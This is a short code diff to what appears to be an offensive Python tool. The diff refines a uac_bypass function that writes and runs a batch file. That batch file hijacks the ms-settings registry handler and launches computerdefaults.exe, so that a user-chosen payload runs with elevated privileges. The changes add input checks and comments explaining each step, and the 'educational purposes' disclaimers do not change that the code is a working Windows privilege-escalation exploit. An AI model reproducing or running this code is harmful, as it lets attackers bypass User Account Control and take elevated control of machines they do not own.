@@ -98,16 +98,25 @@ def install_dependencies():
 
 # Function to perform a UAC bypass (example, use responsibly and ethically)
 def uac_bypass():
-    payload_path = input("[INPUT] Enter the path to the payload executable (e.g., C:\\path\\to\\payload.exe): ")
+    payload_path = input("[INPUT] Enter the path to the payload executable (e.g., C:\\path\\to\\payload.exe): ").strip()
+
+    # Check if the payload path is provided and not empty
+    if not payload_path:
+        print("[ERROR] No payload path provided. Please enter a valid path to the executable.")
+        return
 
     # Example of a simple UAC bypass technique using a registry modification (for educational purposes only)
     uac_bypass_script = f'''
     @echo off
+    rem Add registry entry to change the behavior of ms-settings
     reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "{payload_path}" /f
+    rem Add DelegateExecute key (empty value) to bypass UAC
     reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v "DelegateExecute" /f
+    rem Start computerdefaults.exe to trigger the UAC bypass and execute the payload
     start computerdefaults.exe
     '''
 
+    # Write the batch script to a file
     with open("uac_bypass.bat", "w") as file:
         file.write(uac_bypass_script)
 
